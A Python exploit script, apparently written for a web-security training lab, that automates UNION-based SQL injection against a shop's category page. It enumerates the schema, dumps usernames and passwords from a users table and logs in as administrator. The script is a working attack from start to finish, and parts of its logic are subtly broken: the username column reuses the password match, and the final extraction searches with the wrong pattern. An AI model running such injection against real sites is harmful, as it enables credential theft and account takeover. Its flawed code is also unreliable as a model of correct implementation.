import sys
import logging
import urllib3
import re

import requests

import utils
from shop import Shop


log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main(args):
    sess = requests.Session()
    shop = Shop(args.url, args.no_proxy, sess)
    num_columns = utils.determine_number_of_columns(shop.category_url, shop.no_proxy)
    if not num_columns:
        log.error("Could not determine number of columns. Exiting")
        sys.exit(-1)
    text_columns = utils.determine_text_columns(
        shop.category_url, shop.no_proxy, num_columns
    )
    log.info("Getting users table")
    nulls = ["NULL"] * num_columns
    nulls[text_columns[0]] = "table_name"
    nulls = ",".join(nulls)
    resp = shop.get_category(
        f"' UNION SELECT {nulls} from information_schema.tables where table_schema = 'public'-- "
    )
    pattern = re.compile(r"<th>(users_.*?)</th>")
    m = pattern.search(resp.text)
    users_table = m[1]
    log.info(f"Found users table: {users_table}")
    log.info("Getting columns from table.")
    nulls = ["NULL"] * num_columns
    nulls[text_columns[0]] = "column_name"
    nulls = ",".join(nulls)
    resp = shop.get_category(
        f"' UNION SELECT {nulls} from information_schema.columns where table_name = '{users_table}'-- "
    )
    #passwords
    pattern = re.compile(r"<th>(password_.*?)</th>")
    m = pattern.search(resp.text)
    password_column = m[1]
    #username
    pattern = re.compile(r"<th>(username_.*?)</th>")
    username_column = m[1]
    log.info(f"Got username and pw columns: {username_column}, {password_column}")
    log.info("Getting usernames and pw from db")
    nulls = ["NULL"] * num_columns
    nulls[text_columns[0]] = username_column
    nulls[text_columns[1]] = password_column
    nulls = ",".join(nulls)
    resp = shop.get_category(f"' UNION SELECT {nulls} from {users_table}-- ")
    m = re.search(pattern, resp.text, flags=re.M | re.DOTALL)
    password = m[1]
    log.info(f"Got admin's pw: {password}")
    shop.login("administrator", password)
    shop.is_solved()
    
    
if __name__ == "__main__":
    args=utils.parse_args(sys.argv)
    main(args)
